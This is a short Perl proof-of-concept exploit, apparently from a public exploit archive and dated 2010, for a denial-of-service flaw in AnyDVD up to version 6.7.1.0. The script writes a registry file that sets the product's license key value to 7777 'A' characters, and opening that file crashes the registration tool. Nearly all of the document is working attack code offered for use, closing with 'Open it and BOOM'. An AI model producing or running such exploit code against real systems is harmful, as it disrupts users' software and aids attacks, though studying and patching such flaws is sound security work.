#!/usr/bin/perl
#AnyDVD <= 6.7.1.0 Denial Of Service Vulnerability
#By Havok, from France. (c'est les vacances \o/. Mais y a plus d'essence :(. Rime de leet spotted :P).
#23/10/2010
#Tested on Windows XP SP3.
#Software still available here at the moment : http://static.slysoft.com/SetupAnyDVD.exe
#It seems that RegAnyDVD.exe is our friend. :)

my $w00T_omg= "\x41" x 7777;
open(file,">DoS.AnyDVD");
print file "REGEDIT4\n\n";
print file "[HKEY_LOCAL_MACHINE\\Software\\SlySoft\\AnyDVD\\Key]\n";
print file "\"Key\"=\"$w00T_omg\"";
print "The file has been created successfully. Open it and BOOM. Cheers!";
close(file);